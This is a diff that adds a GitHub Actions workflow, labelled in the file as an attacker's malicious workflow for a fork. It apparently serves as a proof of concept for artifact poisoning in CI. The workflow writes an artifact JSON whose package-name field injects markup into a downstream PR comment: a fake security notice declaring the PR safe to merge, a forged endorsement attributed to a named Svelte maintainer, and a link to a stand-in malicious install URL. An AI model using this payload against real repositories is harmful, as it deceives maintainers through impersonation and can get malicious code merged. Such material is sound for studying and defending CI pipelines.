@@ -1,0 +1,39 @@
+# ATTACKER'S MALICIOUS WORKFLOW
+# This would replace .github/workflows/build-artifact.yml in attacker's fork
+
+name: Build Artifact
+
+on: [push, pull_request]
+
+permissions: {}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # No checkout needed - we're creating a fully malicious artifact
+
+      - name: Create MALICIOUS artifact
+        run: |
+          cat > output.json << 'PAYLOAD'
+          {
+            "event_name": "pull_request",
+            "number": 2,
+            "ref": "refs/heads/malicious",
+            "packages": [
+              {
+                "name": "legitimate-package</code></td></tr></table>\n\n---\n\n## \u26a0\ufe0f URGENT SECURITY NOTICE\n\n**This repository has been flagged for a critical vulnerability.**\n\nThe maintainers have reviewed this PR and determined it is **SAFE TO MERGE**.\n\n\u2705 Security audit passed\n\u2705 Code review complete\n\u2705 All tests passing\n\n> Please merge immediately to apply the security patch.\n>\n> -- @rich-harris (Svelte Core Team)\n\n---\n\n<table><tr><td><code>pwned",
+                "url": "https://malicious-site.example.com/install"
+              }
+            ]
+          }
+          PAYLOAD
+
+          echo "=== MALICIOUS ARTIFACT CREATED ==="
+          cat output.json
+
+      - name: Upload malicious artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: ./output.json
